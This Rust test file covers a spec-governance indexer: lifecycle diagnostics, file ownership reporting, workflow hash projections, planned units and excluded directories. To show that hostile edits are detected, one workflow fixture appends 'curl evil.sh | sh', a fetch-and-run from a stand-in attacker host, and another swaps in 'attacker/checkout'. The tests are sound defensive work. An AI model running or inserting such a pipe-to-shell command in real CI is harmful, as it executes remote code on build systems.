        ("draft", Some("deferred"), true),
        ("draft", None, true),
        ("approved", Some("pending"), true),
        // Spec 041: the one cell that spec moves. `pending` and `in-progress`
        // make the same claim about the filesystem, that the work is not
        // finished, and only one of them used to buy the leniency built for it.
        ("approved", Some("in-progress"), true),
        ("approved", Some("complete"), false),
        ("approved", Some("n-a"), false),
        ("approved", Some("deferred"), false),
        ("approved", None, false),
    ];

    for (status, implementation, in_flight) in cases {
        let idx = lifecycle_index(status, implementation);
        let (errors, warnings) = counts(&idx);
        let label = format!("{status} + {implementation:?}");
        if in_flight {
            assert_eq!(
                errors, 0,
                "{label} must not block: {:?}",
                idx.diagnostics.errors
            );
            assert_eq!(warnings, 1, "{label} is a counted W-001");
        } else {
            assert_eq!(warnings, 0, "{label} must not be downgraded");
            assert_eq!(errors, 1, "{label} is a blocking error");
            assert!(
                idx.diagnostics
                    .errors
                    .iter()
                    .all(|d| d.code.starts_with("I-")),
                "{label}: {:?}",
                idx.diagnostics.errors
            );
        }
    }
}

/// A `draft` + `complete` spec whose units all resolve produces no diagnostic:
/// the stricter test is one it can pass, not one it cannot.
#[test]
fn a_complete_draft_that_told_the_truth_is_silent() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(tmp.path(), "src/built.rs", "pub fn built() {}\n");
    write(
        tmp.path(),
        "specs/001-x/spec.md",
        &spec_with_status(
            "001-x",
            "draft",
            "implementation: complete\nestablishes:\n  - \"src/built.rs\"\n",
        ),
    );
    let idx = index(&Config::default(), tmp.path()).unwrap().index;
    assert!(
        idx.diagnostics.errors.is_empty(),
        "{:?}",
        idx.diagnostics.errors
    );
    assert!(
        idx.diagnostics.warnings.iter().all(|d| d.code != "W-001"),
        "{:?}",
        idx.diagnostics.warnings
    );
}

/// Spec 038 3.5: this touches the lifecycle arm only, never edge authority. An
/// unresolved **non-owning** `references` unit stays `W-002` in every
/// combination, including the one row that moved.
#[test]
fn a_non_owning_reference_stays_w002_in_every_combination() {
    for (status, implementation) in [
        ("draft", "complete"),
        ("draft", "pending"),
        ("draft", "in-progress"),
        ("approved", "complete"),
        ("approved", "pending"),
        ("approved", "in-progress"),
    ] {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
        write(
            tmp.path(),
            "specs/001-x/spec.md",
            &spec_with_status(
                "001-x",
                status,
                &format!(
                    "implementation: {implementation}\nestablishes:\n  - \"src/built.rs\"\n\
                     references:\n  - {{ unit: {{ kind: file, path: \"docs/gone.md\" }}, role: context }}\n"
                ),
            ),
        );
        write(tmp.path(), "src/built.rs", "pub fn built() {}\n");
        let idx = index(&Config::default(), tmp.path()).unwrap().index;
        let label = format!("{status} + {implementation}");
        assert!(
            idx.diagnostics.errors.is_empty(),
            "{label}: a citation is not a claim: {:?}",
            idx.diagnostics.errors
        );
        assert_eq!(
            idx.diagnostics
                .warnings
                .iter()
                .filter(|d| d.code == "W-002")
                .count(),
            1,
            "{label}"
        );
    }
}

/// Spec 041 3.2: leniency is not a pass. A spec at `in-progress` whose units
/// all resolve is silent, and one whose units do not resolve still reports each
/// missing unit by name as a counted `W-001`.
#[test]
fn in_progress_leniency_reports_rather_than_ignores() {
    let silent = lifecycle_index_with("approved", Some("in-progress"), true);
    assert_eq!(counts(&silent), (0, 0), "{:?}", silent.diagnostics);

    let reported = lifecycle_index("approved", Some("in-progress"));
    let (errors, warnings) = counts(&reported);
    assert_eq!((errors, warnings), (0, 1), "a warning, not an error");
    assert!(
        reported.diagnostics.warnings[0]
            .message
            .contains("not_built_yet.rs"),
        "the unit is named, so the warning is a report: {:?}",
        reported.diagnostics.warnings
    );
}

// ── spec 048: who owns this path ──────────────────────────────────────────

/// A repo where 001 owns a file by unit, 002 owns the crate by manifest floor,
/// and a third file carries a `// Spec:` header naming 003.
fn owner_fixture(root: &Path) {
    write(root, "Cargo.toml", "[workspace]\nmembers = [\"crate-a\"]\n");
    write(
        root,
        "crate-a/Cargo.toml",
        "[package]\nname = \"crate-a\"\nversion = \"0.1.0\"\n\
         [package.metadata.spec-spine]\nspec = \"002-floor\"\n",
    );
    write(root, "crate-a/src/claimed.rs", "pub fn a() {}\n");
    write(root, "crate-a/src/plain.rs", "pub fn b() {}\n");
    write(
        root,
        "crate-a/src/headed.rs",
        "// Spec: specs/003-header/spec.md\npub fn c() {}\n",
    );
    write(
        root,
        "specs/001-unit/spec.md",
        &spec("001-unit", "establishes:\n  - \"crate-a/src/claimed.rs\"\n"),
    );
    write(root, "specs/002-floor/spec.md", &spec("002-floor", ""));
    write(root, "specs/003-header/spec.md", &spec("003-header", ""));
}

fn owners_of(root: &Path, path: &str) -> spec_spine_core::OwnerReport {
    let cfg = Config::default();
    let registry = spec_spine_core::compile(&cfg, root).unwrap().registry;
    let index = spec_spine_core::index(&cfg, root).unwrap().index;
    spec_spine_core::owner_with(&cfg, &registry, &index, path)
}

/// §3.1: the three linkage kinds are reported separately, because a consumer's
/// next decision depends on which one it is. A unit claim is deliberate; a
/// floor is a blanket that counts as debt for coverage (spec 029).
#[test]
fn owner_separates_unit_floor_and_header_linkage() {
    let tmp = tempfile::tempdir().unwrap();
    owner_fixture(tmp.path());

    let claimed = owners_of(tmp.path(), "crate-a/src/claimed.rs");
    let unit = claimed
        .owners
        .iter()
        .find(|o| o.spec_id == "001-unit")
        .expect("the unit owner: {claimed:?}");
    assert_eq!(unit.kind, spec_spine_core::OwnerKind::Unit);
    assert!(unit.claim.contains("establishes"), "{}", unit.claim);
    // The floor owner is reported too, and as a floor.
    let floor = claimed
        .owners
        .iter()
        .find(|o| o.spec_id == "002-floor")
        .expect("the floor owner");
    assert_eq!(floor.kind, spec_spine_core::OwnerKind::Floor);

    // A file only the floor covers reports exactly that, and nothing stronger.
    let plain = owners_of(tmp.path(), "crate-a/src/plain.rs");
    assert_eq!(plain.owners.len(), 1, "{plain:?}");
    assert_eq!(plain.owners[0].spec_id, "002-floor");
    assert_eq!(plain.owners[0].kind, spec_spine_core::OwnerKind::Floor);

    // And a `// Spec:` header is its own kind: the file naming its own spec.
    let headed = owners_of(tmp.path(), "crate-a/src/headed.rs");
    assert!(
        headed
            .owners
            .iter()
            .any(|o| o.spec_id == "003-header" && o.kind == spec_spine_core::OwnerKind::Header),
        "{headed:?}"
    );
}

/// §3.1: a path nothing owns exits with an empty result, not an error. It is a
/// true and common answer on a specify-first corpus, and the path need not
/// exist: asking who *would* own a file before creating it is legitimate.
#[test]
fn owner_of_an_unowned_or_absent_path_is_empty() {
    let tmp = tempfile::tempdir().unwrap();
    owner_fixture(tmp.path());
    assert!(
        owners_of(tmp.path(), "outside/nothing.rs")
            .owners
            .is_empty(),
        "unowned"
    );
    assert!(
        owners_of(tmp.path(), "outside/does-not-exist-yet.rs")
            .owners
            .is_empty(),
        "a path that does not exist on disk is answered, not refused"
    );
}

/// §3.2: the answer is the gate's own, not a second implementation. Whatever
/// `owners_for_path` returns for the whole-file reading is exactly the id set
/// reported, so `index owner` and a `C-001` decision cannot disagree.
#[test]
fn owner_reports_exactly_the_gates_id_set() {
    let tmp = tempfile::tempdir().unwrap();
    owner_fixture(tmp.path());
    let cfg = Config::default();
    let registry = spec_spine_core::compile(&cfg, tmp.path()).unwrap().registry;
    let index = spec_spine_core::index(&cfg, tmp.path()).unwrap().index;

    for path in [
        "crate-a/src/claimed.rs",
        "crate-a/src/plain.rs",
        "crate-a/src/headed.rs",
        "outside/nothing.rs",
    ] {
        let gate = spec_spine_core::owners_for_path(
            "specs",
            path,
            &[],
            &index,
            &spec_spine_core::build_superseders(&registry),
        );
        let mut reported: Vec<String> = spec_spine_core::owner_with(&cfg, &registry, &index, path)
            .owners
            .into_iter()
            .map(|o| o.spec_id)
            .collect();
        reported.dedup();
        let expected: Vec<String> = gate.into_iter().collect();
        assert_eq!(reported, expected, "id sets must agree for {path}");
    }
}

/// §3.2: supersession transfer applies unchanged, and the successor is reported
/// with the relation that conferred the authority rather than as a claim it
/// never made.
#[test]
fn a_superseding_spec_is_reported_as_inherited() {
    let tmp = tempfile::tempdir().unwrap();
    let r = tmp.path();
    write(r, "Cargo.toml", "[workspace]\nmembers = [\"crate-a\"]\n");
    write(
        r,
        "crate-a/Cargo.toml",
        "[package]\nname = \"crate-a\"\nversion = \"0.1.0\"\n",
    );
    write(r, "crate-a/src/lib.rs", "pub fn a() {}\n");
    write(
        r,
        "specs/001-old/spec.md",
        &spec("001-old", "establishes:\n  - \"crate-a/src/lib.rs\"\n"),
    );
    write(
        r,
        "specs/002-new/spec.md",
        &spec("002-new", "supersedes:\n  - \"001-old\"\n"),
    );

    let report = owners_of(r, "crate-a/src/lib.rs");
    let new = report
        .owners
        .iter()
        .find(|o| o.spec_id == "002-new")
        .expect("the successor inherits: {report:?}");
    assert_eq!(new.kind, spec_spine_core::OwnerKind::Inherited);
    assert!(new.claim.contains("supersedes 001-old"), "{}", new.claim);
    // Additive: the predecessor keeps its claim.
    assert!(
        report
            .owners
            .iter()
            .any(|o| o.spec_id == "001-old" && o.kind == spec_spine_core::OwnerKind::Unit),
        "{report:?}"
    );
}

// ── spec 060: a workflow folds as its governance projection ─────────────────

/// A workflow whose bump must be invisible to the ledger, and whose every
/// other edit must not be.
const WF: &str = "name: CI\n\
on:\n  push:\n    branches: [main]\n\
jobs:\n\
\x20 build:\n\
\x20   runs-on: ubuntu-latest\n\
\x20   env:\n      MODE: fast\n\
\x20   steps:\n\
\x20     - uses: actions/checkout@v4\n\
\x20     - uses: actions/setup-node@8f152de45cc393bb48ce5d89d36b731f54556e65\n\
\x20     - uses: ./.github/actions/local\n\
\x20     - uses: some/action/sub@v1\n\
\x20     - name: test\n        if: always()\n        run: cargo test\n";

fn proj(content: &str) -> String {
    spec_spine_core::manifest::workflow_hash_projection(content)
        .expect("the fixture parses as a mapping")
}

/// Spec 060 3.1: only the pinned ref is dropped. A tag bump and a SHA-pin bump
/// are the two shapes Dependabot produces, and neither is a governed change.
#[test]
fn a_uses_ref_bump_leaves_the_workflow_projection_unchanged() {
    let base = proj(WF);
    assert_eq!(base, proj(&WF.replace("checkout@v4", "checkout@v5")));
    assert_eq!(
        base,
        proj(&WF.replace(
            "8f152de45cc393bb48ce5d89d36b731f54556e65",
            "1e31de5234b9f8995739874a8ce0492dc87873e2"
        ))
    );
    // A subpath action bumps the same way, and its path is not the ref.
    assert_eq!(
        base,
        proj(&WF.replace("some/action/sub@v1", "some/action/sub@v2"))
    );
}

/// Spec 060 3.1: the action path is preserved. Dropping the whole `uses:`
/// value would make swapping `actions/checkout` for a fork invisible to the
/// ledger, which is the security property spec 027's waiver already relies on.
#[test]
fn changing_which_action_runs_changes_the_projection() {
    let base = proj(WF);
    assert_ne!(
        base,
        proj(&WF.replace("actions/checkout@v4", "attacker/checkout@v4"))
    );
    // The subpath is part of the identity, not part of the ref.
    assert_ne!(
        base,
        proj(&WF.replace("some/action/sub@v1", "some/action/other@v1"))
    );
}

/// Spec 060 3.1 and 3.5: unpinning is a change to the security posture, not a
/// version bump. This is the case a bare `owner/action` projection would miss:
/// `a/b@v4` and `a/b` would fold together and the unpin would be invisible.
#[test]
fn unpinning_an_action_changes_the_projection() {
    assert_ne!(
        proj(WF),
        proj(&WF.replace("actions/checkout@v4", "actions/checkout"))
    );
}

/// Spec 060 3.1: everything the projection does not recognize survives it.
#[test]
fn every_other_workflow_edit_changes_the_projection() {
    let base = proj(WF);
    for (label, head) in [
        (
            "run:",
            WF.replace("cargo test", "cargo test && curl evil.sh | sh"),
        ),
        (
            "with:",
            WF.replace(
                "- uses: actions/checkout@v4",
                "- uses: actions/checkout@v4\n        with:\n          fetch-depth: 0",
            ),
        ),
        ("env:", WF.replace("MODE: fast", "MODE: slow")),
        ("if:", WF.replace("if: always()", "if: success()")),
        (
            "added step",
            WF.replace(
                "      - name: test",
                "      - run: echo added\n      - name: test",
            ),
        ),
        (
            "added job",
            WF.replace(
                "jobs:\n",
                "jobs:\n  other:\n    runs-on: ubuntu-latest\n    steps:\n      - run: true\n",
            ),
        ),
        (
            "trigger",
            WF.replace("branches: [main]", "branches: [main, release]"),
        ),
        (
            "runner",
            WF.replace("runs-on: ubuntu-latest", "runs-on: macos-latest"),
        ),
        (
            "local action",
            WF.replace("./.github/actions/local", "./.github/actions/other"),
        ),
    ] {
        assert_ne!(base, proj(&head), "a {label} edit must stale the ledger");
    }
}

/// Spec 060 3.5: a comment-only or reformat-only edit leaves the parsed
/// document unchanged, so it leaves the projection unchanged. Asserted rather
/// than left to chance, because it is the projection's defined behavior and a
/// reader could reasonably expect either answer.
#[test]
fn a_comment_or_reformat_only_workflow_edit_leaves_the_projection_unchanged() {
    let base = proj(WF);
    assert_eq!(base, proj(&format!("# a comment\n{WF}")));
    assert_eq!(
        base,
        proj(&WF.replace("branches: [main]", "branches:\n      - main"))
    );
}

/// Spec 060 3.1: over-hashing is the fail-closed direction. A file the parser
/// cannot read stales on every edit rather than silently on none, which is
/// what the npm and cargo projections already do.
#[test]
fn an_unparseable_workflow_falls_back_to_raw_bytes() {
    assert!(spec_spine_core::manifest::workflow_hash_projection("a: [unclosed\n").is_none());
    // A parseable document that is not a mapping is not a workflow either.
    assert!(spec_spine_core::manifest::workflow_hash_projection("- just\n- a list\n").is_none());
}

/// Spec 060 3.5, end to end on a real index: the whole point of the change is
/// that the global-inputs scalar every shard hash carries stops moving under a
/// bump the bot cannot repair.
#[cfg(feature = "symbol-resolution")]
#[test]
fn a_workflow_bump_leaves_every_shard_hash_alone_and_a_run_edit_does_not() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    write(root, "Cargo.toml", "[workspace]\nmembers = []\n");
    write(
        root,
        "spec-spine.toml",
        "[index]\nextra_hashed_inputs = [\".github/workflows/**/*\"]\n",
    );
    write(
        root,
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \".github/workflows/ci.yml\"\n---\n# 001-a\n## body\n",
    );
    write(root, ".github/workflows/ci.yml", WF);

    let cfg =
        spec_spine_types::load_config(&fs::read_to_string(root.join("spec-spine.toml")).unwrap())
            .unwrap();
    let before = shard::global_inputs_hash(&cfg, root);

    write(
        root,
        ".github/workflows/ci.yml",
        &WF.replace("checkout@v4", "checkout@v5"),
    );
    assert_eq!(
        before,
        shard::global_inputs_hash(&cfg, root),
        "a `uses:` bump must leave the scalar every shard hash folds"
    );

    write(
        root,
        ".github/workflows/ci.yml",
        &WF.replace("cargo test", "cargo bench"),
    );
    assert_ne!(
        before,
        shard::global_inputs_hash(&cfg, root),
        "a `run:` edit is a governed change and must still stale the ledger"
    );
}

// ── spec 063: planned territory is declared, not inferred ───────────────────

/// A corpus with one spec claiming `unit_yaml` (a frontmatter fragment).
fn planned_fixture(unit_yaml: &str, status: &str, implementation: &str) -> tempfile::TempDir {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(
        tmp.path(),
        "specs/001-a/spec.md",
        &format!(
            "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: {status}\ncreated: \"2026-09-08\"\n\
             implementation: {implementation}\nsummary: \"s\"\nestablishes:\n{unit_yaml}\
             ---\n# 001-a\n## body\n"
        ),
    );
    tmp
}

fn diag_codes(tmp: &tempfile::TempDir) -> Vec<String> {
    let idx = index(&Config::default(), tmp.path()).unwrap().index;
    idx.diagnostics
        .warnings
        .iter()
        .chain(idx.diagnostics.errors.iter())
        .map(|d| d.code.clone())
        .collect::<std::collections::BTreeSet<_>>()
        .into_iter()
        .collect()
}

/// Spec 063 §3.2, and the case the spec was filed for: a draft that declares
/// territory it has not written passes, while a draft with a path that is
/// simply wrong still does not. That asymmetry is the whole safety argument.
#[test]
fn a_planned_unit_produces_no_diagnostic_and_an_unmarked_one_still_does() {
    let planned = planned_fixture(
        "  - { kind: file, path: \"src/not-written-yet.rs\", planned: true }\n",
        "draft",
        "pending",
    );
    assert!(
        !diag_codes(&planned).iter().any(|c| c.starts_with("W-00")),
        "a planned unit is a declared state, not a suppressed diagnostic: {:?}",
        diag_codes(&planned)
    );

    let unmarked = planned_fixture("  - \"src/typo.rs\"\n", "draft", "pending");
    assert!(
        diag_codes(&unmarked).iter().any(|c| c == "W-001"),
        "a path that is simply wrong must still be caught: {:?}",
        diag_codes(&unmarked)
    );
}

/// Spec 063 §3.2: every other classification is unchanged. A settled spec's
/// unresolved unit is still a hard error, and marking it planned is the only
/// thing that changes that.
#[test]
fn planned_does_not_soften_any_other_classification() {
    let settled = planned_fixture("  - \"src/gone.rs\"\n", "approved", "complete");
    let codes = diag_codes(&settled);
    assert!(
        codes.iter().any(|c| c.starts_with("I-0")),
        "a settled spec's unresolved unit is still a hard error: {codes:?}"
    );
}

/// Spec 063 §3.2 and §3.4: a planned unit contributes nothing while it does not
/// resolve, and everything once it does. `authorities` must answer for it
/// exactly as for an unplanned claim, which is why the index stores subjects.
#[test]
fn a_planned_unit_that_resolves_is_owned_like_any_other() {
    let tmp = planned_fixture(
        "  - { kind: file, path: \"src/a.rs\", planned: true }\n",
        "draft",
        "pending",
    );
    // Not written yet: no location, no implementing path.
    let before = index(&Config::default(), tmp.path()).unwrap().index;
    assert!(
        before.traceability.mappings[0]
            .implementing_paths
            .is_empty(),
        "a declaration of intent is not a declaration of ownership"
    );

    // Now it lands, and the flag is still on the claim.
    write(tmp.path(), "src/a.rs", "pub fn a() {}\n");
    let after = index(&Config::default(), tmp.path()).unwrap().index;
    assert!(
        after.traceability.mappings[0]
            .implementing_paths
            .iter()
            .any(|p| p.path == "src/a.rs"),
        "a resolved planned unit participates in ownership"
    );
    assert_eq!(
        authorities(&after, &Unit::file("src/a.rs")),
        vec!["001-a".to_string()],
        "the lookup must not have to know the claim was planned"
    );
}

// ── spec 075: the claim window and the recognizer, declared ──────────────

/// A floorless crate holding one file with `content`, and the spec
/// `000-bootstrap` its header can name. Returns the specs that own the file
/// **through a comment header**, which is the only claim the fixture makes.
fn header_owners(file: &str, content: &str) -> Vec<String> {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    write(root, "Cargo.toml", "[workspace]\nmembers = [\"crate-a\"]\n");
    write(
        root,
        "crate-a/Cargo.toml",
        "[package]\nname = \"crate-a\"\nversion = \"0.1.0\"\n",
    );
    write(root, &format!("crate-a/{file}"), content);
    write(
        root,
        "specs/000-bootstrap/spec.md",
        &spec("000-bootstrap", ""),
    );
    owners_of(root, &format!("crate-a/{file}"))
        .owners
        .into_iter()
        .filter(|o| o.kind == spec_spine_core::OwnerKind::Header)
        .map(|o| o.spec_id)
        .collect()
}

/// `line` placed on 1-based line `n`, after `n - 1` filler lines.
fn on_line(n: usize, line: &str) -> String {
    format!("{}{line}\npub fn f() {{}}\n", "// filler\n".repeat(n - 1))
}

const DOCUMENTED: &str = "// Spec: specs/000-bootstrap/spec.md";

/// §3.1: the window is sixteen lines, and line 17 is outside it.
#[test]
fn a_header_on_line_16_claims_and_on_line_17_does_not() {
    assert_eq!(spec_spine_core::index::COMMENT_HEADER_CLAIM_WINDOW, 16);
    assert_eq!(
        header_owners("src/lib.rs", &on_line(16, DOCUMENTED)),
        vec!["000-bootstrap"]
    );
    assert!(header_owners("src/lib.rs", &on_line(17, DOCUMENTED)).is_empty());
}

/// §3.2: `//!` leaves the `!` in the way of `Spec:`, so an inner doc comment is
/// prose and claims nothing.
#[test]
fn an_inner_doc_comment_header_does_not_claim() {
    assert!(
        header_owners(
            "src/lib.rs",
            "//! Spec: specs/000-bootstrap/spec.md\npub fn f() {}\n"
        )
        .is_empty()
    );
}

/// §3.2 step 2: `#` is the marker for `.sh` (and `.py`).
#[test]
fn a_hash_header_claims_in_a_shell_script() {
    assert_eq!(
        header_owners(
            "scripts/run.sh",
            "#!/bin/sh\n# Spec: specs/000-bootstrap/spec.md\necho hi\n"
        ),
        vec!["000-bootstrap"]
    );
}

/// §3.2: the first attempt decides. An unresolvable reference stops the scan,
/// so it shadows a valid header on the next line and the file claims nothing.
#[test]
fn an_unresolvable_header_stops_the_scan_and_shadows_a_valid_one() {
    assert!(
        header_owners(
            "src/lib.rs",
            "// Spec: specs/999-gone/spec.md\n// Spec: specs/000-bootstrap/spec.md\npub fn f() {}\n"
        )
        .is_empty()
    );
    // The control: the valid header alone claims.
    assert_eq!(
        header_owners(
            "src/lib.rs",
            "// Spec: specs/000-bootstrap/spec.md\npub fn f() {}\n"
        ),
        vec!["000-bootstrap"]
    );
}

/// §3.2's table, one regression case per row. These assert no new behavior:
/// the recognizer is looser than the documented form, and §3.2 is the first
/// document to say so, so a later reading of it as the stricter rule would
/// silently withdraw these claims. Each row must keep claiming.
#[test]
fn every_loose_form_in_the_recognizer_table_still_claims() {
    for (file, line) in [
        ("src/lib.rs", "// Spec: specs/000-bootstrap/spec.md"),
        ("scripts/run.sh", "# Spec: specs/000-bootstrap/spec.md"),
        ("src/lib.rs", "Spec: specs/000-bootstrap/spec.md"),
        ("src/lib.rs", "// Spec: specs/000-bootstrap/spec.md/spec.md"),
        ("src/lib.rs", "// Spec: 000-bootstrap"),
        (
            "src/lib.rs",
            "// Spec: anything/at/all/000-bootstrap/spec.md",
        ),
    ] {
        assert_eq!(
            header_owners(file, &format!("{line}\n")),
            vec!["000-bootstrap"],
            "{line:?} in {file} must still claim"
        );
    }
}

// ── spec 092 §3.8, §3.9: `.statecraft/` is a parent, not a classification ──

/// The managed layout: the derived tree and the state root under one parent,
/// classified separately.
fn statecraft_layout_config() -> Config {
    let mut cfg = Config::default();
    cfg.layout.derived_dir = ".statecraft/derived".to_string();
    cfg.layout.state_dir = ".statecraft/state".to_string();
    cfg
}

/// §3.9: three answers, one parent directory, and they must be distinguishable
/// by measurement rather than by inspection.
///
/// A source file under `.statecraft/` is governed territory and the walk sees
/// it. One under `.statecraft/state/` is spec 036's ungoverned root and the
/// walk does not. One under `.statecraft/derived/` is compiler output and the
/// walk does not, which is the half spec 092 §3.8 added: `resolver_exclusions`
/// matches path COMPONENTS, so the default `.derived` was reachable as one and
/// a nested root is not.
///
/// The control is the same tree read under the DEFAULT configuration, where
/// none of the three is special and all three are enumerated. Without it a
/// green here is also what a walk that had stopped descending into
/// `.statecraft/` altogether would produce, which is the failure §3.9 refuses.
#[test]
fn statecraft_derived_and_state_are_pruned_and_the_rest_is_governed() {
    let tmp = tempfile::tempdir().unwrap();
    let r = tmp.path();
    write(r, "Cargo.toml", "[workspace]\nmembers = []\n");
    write(r, ".statecraft/tools/thing.sh", "#!/bin/sh\necho hi\n");
    write(r, ".statecraft/AGENTS.md", "# project instructions\n");
    write(r, ".statecraft/state/scratch.sh", "#!/bin/sh\n");
    write(
        r,
        ".statecraft/derived/spec-registry/by-spec/000-a.json",
        "{}\n",
    );
    write(r, ".statecraft/derived/gen.sh", "#!/bin/sh\n");

    let managed = spec_spine_core::walk_repository(&statecraft_layout_config(), r);
    assert!(
        managed.contains(".statecraft/tools/thing.sh"),
        "a governed file under the parent stays visible: {managed:?}"
    );
    assert!(
        managed.contains(".statecraft/AGENTS.md"),
        "so does the project instruction file: {managed:?}"
    );
    assert!(
        !managed.iter().any(|p| p.starts_with(".statecraft/state/")),
        "runtime state is excluded: {managed:?}"
    );
    assert!(
        !managed
            .iter()
            .any(|p| p.starts_with(".statecraft/derived/")),
        "compiler output is excluded: {managed:?}"
    );

    // The control: under the default configuration these are ordinary paths,
    // so the exclusions above are the configuration's doing and not the
    // directory name's.
    let default = spec_spine_core::walk_repository(&Config::default(), r);
    for p in [
        ".statecraft/tools/thing.sh",
        ".statecraft/state/scratch.sh",
        ".statecraft/derived/gen.sh",
    ] {
        assert!(
            default.contains(p),
            "`{p}` must be enumerated under the default configuration, or this \
             test's exclusions prove nothing: {default:?}"
        );
    }
}

/// §3.8: the same rule at the unit level, since `is_derived_path` is what both
/// the walks and the coupling gate ask. Separator-aware, so a sibling that
/// merely shares the prefix is not the derived tree.
#[test]
fn statecraft_derived_matching_is_separator_aware() {
    let cfg = statecraft_layout_config();
    assert!(cfg.layout.is_derived_path(".statecraft/derived"));
    assert!(cfg.layout.is_derived_path(".statecraft/derived/a/b.json"));
    assert!(
        !cfg.layout
            .is_derived_path(".statecraft/derived-backup/a.json")
    );
    assert!(!cfg.layout.is_derived_path(".statecraft"));
    assert!(!cfg.layout.is_derived_path(".statecraft/AGENTS.md"));
    // The default keeps answering for the default.
    assert!(Config::default().layout.is_derived_path(".derived/x.json"));
    assert!(
        !Config::default()
            .layout
            .is_derived_path(".statecraft/derived/x.json")
    );
}
